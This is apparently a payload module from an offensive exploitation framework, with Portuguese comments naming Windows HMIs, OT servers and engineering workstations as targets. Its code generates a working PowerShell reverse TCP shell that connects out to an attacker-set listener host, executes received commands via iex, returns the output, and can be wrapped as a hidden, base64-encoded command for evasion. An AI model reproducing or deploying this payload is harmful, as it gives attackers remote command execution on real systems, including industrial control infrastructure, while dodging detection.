"""PowerShell Reverse TCP Shell.

One-liner PowerShell para shell reverso TCP.
Útil em targets Windows: HMIs industriais, servidores OT, workstations de engenharia.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "PowerShell Reverse TCP",
        "description": "PowerShell one-liner reverse TCP shell for Windows targets.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
        "HIDDEN": {"description": "Run in hidden window", "required": False, "default": "true", "value": "true"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        ps_oneliner = (
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$e=(New-Object Text.ASCIIEncoding).GetBytes($r2);"
            "$s.Write($e,0,$e.Length)"
            "};$c.Close()"
        )
        return ps_oneliner.encode()

    def as_encoded_command(self) -> bytes:
        """Retorna o payload como powershell -enc <base64> para evasão."""
        import base64
        raw = self.generate()
        enc = base64.b64encode(raw.decode().encode("utf-16-le")).decode()
        return f"powershell -nop -w hidden -enc {enc}".encode()
